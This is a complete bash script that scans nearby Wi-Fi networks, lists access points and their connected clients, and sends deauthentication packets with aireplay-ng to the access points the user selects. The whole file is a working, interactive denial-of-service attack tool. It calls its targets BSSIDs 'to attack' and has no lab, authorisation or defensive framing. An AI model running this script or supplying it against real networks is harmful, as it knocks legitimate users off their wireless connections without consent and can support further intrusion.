#!/bin/bash

# ------------ CONFIGURATION ------------
INTERFACE="wlan0"               # Physical wireless interface
DEAUTH_COUNT=10                 # Number of deauth packets (0 = infinite)
TEMP_PREFIX="ssid_scan"        # Prefix for airodump-ng output files
CSV_FILE="${TEMP_PREFIX}-01.csv"  # Airodump-ng output CSV file
SCAN_DURATION=20                # Time (in seconds) to scan for SSIDs

# ------------ CLEANUP FUNCTION ------------
cleanup() {
    echo -e "\n[*] Running cleanup..."

    # Find any active monitor interface (only one used in this script)
    MONITOR_INTERFACE_ACTIVE=$(iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface; exit}')

    # Stop monitor mode if it is active
    if [[ -n "$MONITOR_INTERFACE_ACTIVE" ]]; then
        echo "[*] Stopping monitor mode on $MONITOR_INTERFACE_ACTIVE..."
        sudo airmon-ng stop "$MONITOR_INTERFACE_ACTIVE" > /dev/null
    fi

    # Restart NetworkManager to restore internet and Wi-Fi control
    echo "[*] Restarting NetworkManager to restore connectivity..."
    sudo service NetworkManager restart > /dev/null

    # Remove temporary output files
    echo "[*] Removing temporary files..."
    rm -f ${TEMP_PREFIX}-*

    echo "[✓] Cleanup complete."
}

# Automatically run cleanup on script exit (normal or interrupted)
trap cleanup EXIT

# ------------ ENABLE MONITOR MODE ------------
echo "[*] Enabling monitor mode on $INTERFACE..."
sudo airmon-ng check kill > /dev/null   # Kill interfering processes (e.g. NetworkManager)
sudo airmon-ng start "$INTERFACE" > /dev/null  # Start monitor mode on the selected interface
sleep 1

# Get the new monitor-mode interface name (e.g. wlan0mon)
MONITOR_INTERFACE=$(iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface; exit}')

if [[ -z "$MONITOR_INTERFACE" ]]; then
    echo "[!] Error: Unable to enable or find a monitor mode interface."
    exit 1
fi

echo "[✓] Monitor interface active: $MONITOR_INTERFACE"

# ------------ SCAN AVAILABLE NETWORKS ------------
echo "[*] Scanning networks for $SCAN_DURATION seconds. Press Ctrl+C to stop early."
sudo timeout "$SCAN_DURATION" airodump-ng --output-format csv -w "$TEMP_PREFIX" "$MONITOR_INTERFACE"

# Check if the CSV was created
if [[ ! -f "$CSV_FILE" ]]; then
    echo "[!] CSV file not created. Aborting."
    exit 1
fi

# ------------ EXTRACT SSIDs USING PYTHON ------------
echo ""
echo "[*] Detected SSIDs:"

# Use Python to parse the CSV and extract unique SSID names
SSID_LIST=($(python3 -c "
import csv

ssids = set()
skip_line = False
with open('$CSV_FILE', newline='') as csvfile:
    reader = csv.reader(csvfile)
    for row in reader:
        if not row:
            continue
        if row[0].strip() == 'BSSID':
            skip_line = True
            header = row
            continue
        if skip_line:
            if row[0].strip() == 'Station MAC':
                break
            if len(row) > 13:
                essid = row[13].strip()
                if essid and not essid.startswith('length:'):
                    ssids.add(essid)
for ssid in sorted(ssids):
    print(ssid.replace(' ', '_SPACE_'))
"))

# If no SSIDs were found
if [[ ${#SSID_LIST[@]} -eq 0 ]]; then
    echo "[!] No SSIDs found."
    exit 1
fi

# Show the user the list of SSIDs
for i in "${!SSID_LIST[@]}"; do
    echo " [$i] ${SSID_LIST[$i]//_SPACE_/ }"
done

# ------------ SSID SELECTION ------------
while true; do
    read -p "[?] Select an SSID (number): " SSID_INDEX
    if [[ "$SSID_INDEX" =~ ^[0-9]+$ ]] && [ "$SSID_INDEX" -ge 0 ] && [ "$SSID_INDEX" -lt "${#SSID_LIST[@]}" ]; then
        SSID_SELECTED_TEMP="${SSID_LIST[$SSID_INDEX]}"
        SSID_SELECTED="${SSID_SELECTED_TEMP//_SPACE_/ }"  # Replace placeholder with space
        echo "[✓] Selected SSID: $SSID_SELECTED"
        break
    else
        echo "[!] Invalid selection. Try again."
    fi
done

# ------------ EXTRACT BSSID/CHANNEL/POWER/CLIENTS ------------
# Use Python to extract AP details matching the selected SSID
BSSID_DETAILS=$(python3 -c "
import csv
import sys
from collections import defaultdict

target_ssid = '$SSID_SELECTED'
ap_data = {}
client_counts = defaultdict(int)

# Parse AP section of CSV
skip_line_ap = False
with open('$CSV_FILE', newline='') as csvfile:
    reader = csv.reader(csvfile)
    for row in reader:
        if not row:
            continue
        if row[0].strip() == 'BSSID':
            skip_line_ap = True
            continue
        if skip_line_ap:
            if row[0].strip() == 'Station MAC':
                break
            if len(row) > 13:
                bssid = row[0].strip()
                channel = row[3].strip()
                power = row[8].strip()
                essid = row[13].strip()
                if essid == target_ssid and bssid and channel:
                    ap_data[bssid] = {'channel': channel, 'power': power}

# Parse clients section and count how many are connected to each BSSID
skip_line_client = False
with open('$CSV_FILE', newline='') as csvfile:
    reader = csv.reader(csvfile)
    for row in reader:
        if not row:
            continue
        if row[0].strip() == 'Station MAC':
            skip_line_client = True
            continue
        if skip_line_client:
            if len(row) > 5 and row[5].strip():
                ap_mac = row[5].strip()
                if ap_mac in ap_data:
                    client_counts[ap_mac] += 1

results = []
for bssid, details in ap_data.items():
    num_clients = client_counts[bssid]
    results.append((bssid, details['channel'], details['power'], num_clients))

for bssid, ch, pwr, clients in results:
    print(f'{bssid},{ch},{pwr},{clients}')
")

# If no matching BSSID found
if [[ -z "$BSSID_DETAILS" ]]; then
    echo "[!] No BSSID found for '$SSID_SELECTED'"
    exit 1
fi

# Show APs found for selected SSID
echo ""
echo "[*] Found $(echo "$BSSID_DETAILS" | wc -l) APs for SSID '$SSID_SELECTED'"
echo "Select one or more BSSIDs to attack (e.g. 0,2,3 or 'all' for all):"
echo "-------------------------------------------------------------------"

# Prepare array of BSSID info
declare -a BSSID_ARRAY
IFS=$'\n' read -r -d '' -a BSSID_ARRAY <<< "$BSSID_DETAILS"

# Print detailed list of BSSIDs
for i in "${!BSSID_ARRAY[@]}"; do
    IFS=',' read -r bssid channel power clients <<< "${BSSID_ARRAY[$i]}"
    echo " [$i] $bssid (Channel: $channel, Power: $power dBm, Clients: $clients)"
done

# ------------ BSSID SELECTION ------------
SELECTED_BSSIDS=()
while true; do
    read -p "[?] Enter selection: " BSSID_SELECTION_INPUT

    if [[ "$BSSID_SELECTION_INPUT" == "all" ]]; then
        for item in "${BSSID_ARRAY[@]}"; do
            IFS=',' read -r bssid channel power clients <<< "$item"
            SELECTED_BSSIDS+=("$bssid,$channel")
        done
        echo "[✓] All BSSIDs selected."
        break
    else
        IFS=',' read -r -a INDICES <<< "$BSSID_SELECTION_INPUT"
        VALID_SELECTION=true
        TEMP_SELECTED=()
        for index in "${INDICES[@]}"; do
            if [[ "$index" =~ ^[0-9]+$ ]] && [ "$index" -ge 0 ] && [ "$index" -lt "${#BSSID_ARRAY[@]}" ]; then
                IFS=',' read -r bssid channel power clients <<< "${BSSID_ARRAY[$index]}"
                TEMP_SELECTED+=("$bssid,$channel")
            else
                echo "[!] Invalid selection: $index. Try again."
                VALID_SELECTION=false
                break
            fi
        done

        if $VALID_SELECTION; then
            SELECTED_BSSIDS=("${TEMP_SELECTED[@]}")
            echo "[✓] Selected BSSIDs:"
            for item in "${SELECTED_BSSIDS[@]}"; do
                echo "    $item"
            done
            break
        fi
    fi
done

# ------------ PERFORM DEAUTH ATTACK ------------
for BSSID_CHANNEL_PAIR in "${SELECTED_BSSIDS[@]}"; do
    IFS=',' read -r BSSID CHANNEL <<< "$BSSID_CHANNEL_PAIR"
    if [[ -n "$BSSID" && -n "$CHANNEL" ]]; then
        echo ""
        echo "[*] Preparing attack on BSSID: $BSSID on Channel: $CHANNEL"
        echo "[*] Setting $MONITOR_INTERFACE to channel $CHANNEL..."
        sudo iwconfig "$MONITOR_INTERFACE" channel "$CHANNEL"

        # Wait to ensure channel has changed
        sleep 1
        CURRENT_CHANNEL=$(iw dev "$MONITOR_INTERFACE" info | grep 'channel' | awk '{print $2}')

        if [[ "$CURRENT_CHANNEL" != "$CHANNEL" ]]; then
            echo "[!] Error: Unable to set channel $CHANNEL (current: $CURRENT_CHANNEL). Skipping."
            continue
        fi

        echo "[✓] Channel set successfully."
        echo "[*] Sending $DEAUTH_COUNT deauth packets to $BSSID..."
        sudo aireplay-ng --deauth "$DEAUTH_COUNT" -a "$BSSID" "$MONITOR_INTERFACE"
        sleep 1
    fi
done

echo ""
echo "[✓] Attack complete."
exit 0
